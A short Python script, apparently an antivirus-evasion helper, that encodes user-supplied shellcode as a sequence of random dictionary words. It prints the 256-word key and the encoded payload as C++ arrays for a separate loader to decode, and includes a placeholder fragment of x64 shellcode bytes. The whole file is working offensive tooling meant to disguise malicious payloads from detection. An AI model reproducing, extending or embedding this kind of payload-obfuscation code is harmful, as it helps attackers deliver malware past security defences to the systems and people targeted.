# Takes ~ 30sec to execute
# You need to add your shellcode
# Output is Key + encrypted_shellcode in C++ 


# pip3 install random-word

from random_word import RandomWords

rw= RandomWords()

table = []
while len(table) < 256:
    word = rw.get_random_word()
    if word not in table:
        table.append(word)

#Print the key, it is a list of 256 random words from dictionnary
#First word correspond to 0X00, 256th word correspond to 0xff
#C++ output because decoding takes place in C++
#We need key + encoded shellcode to decode in c++
print("const char* key[256] = {",end="")
for word in table:
    print(f"\"{word}\",",end="")
print("};")


def encrypt(hex_list, key):
  encrypted = []
  for hex_value in hex_list:
    index = int(hex_value, 16)
    encrypted.append(key[index])
  return encrypted

#Put your shellcode here
#Be careful, you can keep the several "" but it MUST be in ONE LINE, remove semi-colon
shellcode = "\x00\x01\xfe\xff\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50""\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"

shellcode = shellcode.replace('"', '')


hex_list = [hex(ord(c)) for c in shellcode]

encrypted = encrypt(hex_list,table)

print("\nconst char* encrypted["+str(len(encrypted))+"] = {",end="")
for word in encrypted:
    print(f"\"{word}\",",end="")
print("};")

